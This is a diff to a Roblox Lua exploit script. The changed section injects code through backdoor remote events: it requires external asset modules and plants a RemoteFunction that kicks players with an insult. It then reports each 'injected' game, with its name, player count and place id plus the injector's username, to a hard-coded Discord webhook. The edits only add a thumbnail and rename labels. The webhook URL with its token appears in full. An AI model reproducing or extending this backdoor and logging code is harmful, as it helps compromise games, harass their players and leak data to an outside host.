@@ -2801,7 +2801,8 @@ end)
 		        fireRemoteEvent('require(7458325257).antiban()')
 			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.ReplicatedStorage;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
                         fireRemoteEvent('require(3986243232).load("SKID",{"' .. game.Players.LocalPlayer.Name ..  '"})')
-			local HttpService = game:GetService("HttpService")
+			
+            local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 
@@ -2814,6 +2815,7 @@ local request =
     request
 
 local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. localPlayer.UserId .. "&width=420&height=420&format=png"
+local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=" .. game.PlaceId .. "&width=768&height=432&format=png"
 local webhookUrl = "https://discord.com/api/webhooks/1379334256429367326/lbYjlMEpSD48QZ0tKKKoh6fc3t-_NpUJPvwsm6s5c__C5r-ZwxfnFfm7uPg0M9FMfjwC"
 
 if request then
@@ -2821,10 +2823,11 @@ if request then
         title = "- Backdoor Logger -",
         color = 0x00ffcc,
         thumbnail = { url = headshotUrl },
+        image = { url = thumbnailUrl },
         fields = {
             {
                 name = "📍 Place Information",
-                value = "**Name:** " .. game.Name ..
+                value = "**Game Name:** " .. game.Name ..
                         "\n**Active Players:** " .. tostring(#Players:GetPlayers()) ..
                         "\n**Place Id:** " .. game.PlaceId,
                 inline = false
@@ -2842,14 +2845,14 @@ if request then
             }
         },
         footer = {
-            text = "Injected by " .. localPlayer.Name .. "/" .. localPlayer.DisplayName,
+            text = "Injected by " .. localPlayer.Name,
             icon_url = headshotUrl
         },
         timestamp = DateTime.now():ToIsoDate()
     }
 
     local data = {
-        username = "Game Logger",
+        username = "Game logger",
         avatar_url = headshotUrl,
         embeds = { embed }
     }
